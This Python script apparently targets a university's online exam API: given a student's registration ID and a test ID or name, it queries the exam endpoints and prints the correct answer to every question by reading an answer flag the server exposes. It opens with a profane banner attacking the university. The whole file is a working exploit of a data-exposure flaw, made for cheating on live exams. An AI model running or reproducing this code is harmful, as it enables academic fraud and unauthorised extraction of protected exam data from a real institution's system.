import requests as re
from sty import fg, rs, bg, ef

# GLOBALS
WRONG_CHOICE = True
TEST_NOT_FOUND = True


# BANNER
banner = '''
                    Fuck LPU!!
....................../´¯/) 
....................,/¯../ 
.................../..../ 
............./´¯/'...'/´¯¯`·¸ 
........../'/.../..../......./¨¯\ 
........('(...´...´.... ¯~/'...') 
.........\.................'...../ 
..........''...\.......... _.·´ 
............\..............( 
..............\.............\...

'''

# PAYLOADS
payload = {
    'LoginId': None,
    'RoleId': 3,
    'IsDemo': 0
}

q_payload = {
    'TestId': None,
    'Set': 1,
    'LoginId': None
}

o_payload = {
    'QuestionId': None
}

# HEADERS
headers = {
    'Referer': 'oas.lpu.in'
}

# HELPER FUNCTIONS
def getTest(test_id):

    global TEST_NOT_FOUND

    query = re.get('https://oas.lpu.in/api/OnlineExam/GetTestToAttemptDetail', params=payload, headers={'Referer':'oas.lpu.in'})
    result = query.json()

    print(f'{fg.yellow}searching for the test{fg.rs}...')
    for item in result:
        if item['TestId'] == test_id:
            print(f'{fg.green}caught the test!{fg.rs}')
            TEST_NOT_FOUND = False
            break

    if TEST_NOT_FOUND:
        print(f'{fg.red}TEST NOT FOUND... Make sure that test is available{fg.rs}')
        quit()

def getTestId(test_name):

    global TEST_NOT_FOUND

    query = re.get('https://oas.lpu.in/api/OnlineExam/GetTestToAttemptDetail', params=payload, headers={'Referer':'oas.lpu.in'})
    result = query.json()

    print(f'{fg.yellow}searching for the test{fg.rs}...')
    for item in result:
        if item['TestName'] == test_name:
            test_id = item['TestId']
            print(f'{fg.green}caught the test!{fg.rs}')
            TEST_NOT_FOUND = False
            break

    if TEST_NOT_FOUND:
        print(f'{fg.red}TEST NOT FOUND... Make sure that test is available{fg.rs}')
        quit()

    return test_id

def getQuestionsAndAnswers():
    print(f'{fg.yellow}extracting question details...{fg.rs}')
    query = re.get('https://oas.lpu.in/api/OnlineExam/GetQuestionNumbersDetail', params=q_payload, headers={'Referer':'oas.lpu.in'})
    result = query.json()

    print(f'{fg.green}done!{fg.rs}')
    print(f'{fg.blue}fetching answers...{fg.rs}')

    for item in result:
        correct_option = None
        correct_option_answer = None
        o_payload['QuestionId'] = item['QuestionId']

        query = re.get('https://oas.lpu.in/api/OnlineExam/GetQuestionOptionEditDetail', headers={'Referer':'oas.lpu.in'}, params=o_payload)
        result = query.json()

        for option_no, option in enumerate(result, start=1):
            if option['IsRightAnswer'] == 'True':
                correct_option = option_no
                correct_option_answer = option['OptionDescription']
                break

        print(f"[\'Q{item['QuestionNo']})\', \'Option {correct_option}', \'{correct_option_answer}' ]")

if __name__ == "__main__":

    print(banner)

    reg_id = int(input("registration id: "))
    payload['LoginId'] = reg_id
    q_payload['LoginId'] = reg_id

    while(WRONG_CHOICE):
        test_option = int(input("OPTION: 1) test id\t 2) test name: \t"))
        if test_option == 1:
            test_id = int(input("test id: "))
            q_payload['TestId'] = test_id

            getTest(test_id)
            getQuestionsAndAnswers()

            WRONG_CHOICE = False
        
        elif test_option == 2:
            
            test_name = input("test name: ")

            test_id = getTestId(test_name)
            q_payload['TestId'] = test_id

            getTest(test_id)
            getQuestionsAndAnswers()

            WRONG_CHOICE = False
        
        else:
            print("bad input!! try again")
